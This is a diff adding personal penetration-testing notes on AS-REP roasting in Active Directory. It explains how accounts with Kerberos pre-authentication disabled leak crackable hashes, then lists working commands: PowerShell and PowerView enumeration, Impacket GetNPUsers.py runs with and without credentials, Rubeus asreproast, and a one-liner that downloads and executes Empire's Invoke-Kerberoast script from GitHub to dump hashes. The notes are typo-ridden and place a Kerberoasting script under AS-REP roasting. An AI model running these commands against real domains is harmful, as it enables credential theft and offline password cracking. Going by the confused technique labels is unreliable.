@@ -1,3 +1,33 @@
+AS-REP roasting (Dumping users hashes , pre authentication disabled)
+Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
+
+Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users
+on target we can check which users have pre authentication disabled through powershell
+
+    get-aduser -filter * -properties DoesNotRequirePreAuth | where {$.DoesNotRequirePreAuth -eq "True" -and $.Enabled -eq "True"} | select Name
+
+Using PowerView.ps1
+    Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+
+    Using Impacket (REmotely without authentication)
+we require list of usernames on target. we can find those from kerbrute and supply here
+
+    Without AUthentication
+    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS -users kerbuser.txt -no-pass
+
+          With Authentication                                                    OR 
+    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/Machine1:Password1 -dc-ip IPADDRESS -users kerbuser.txt
+
+    Using Rubeus
+using rubeus is prefereed because it automatically enumerate users
+
+    Rubeus.exe asreproast (we can also specify specific user to target by adding /username:password in this command. also domain or domaincontroller)
+
+            or
+
+    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+
+
 AS-REP Roasting
 The first step of the authentication process via Kerberos is to send an AS-REQ. 
 Based on this request, the DC can validate if authentication is successful. 
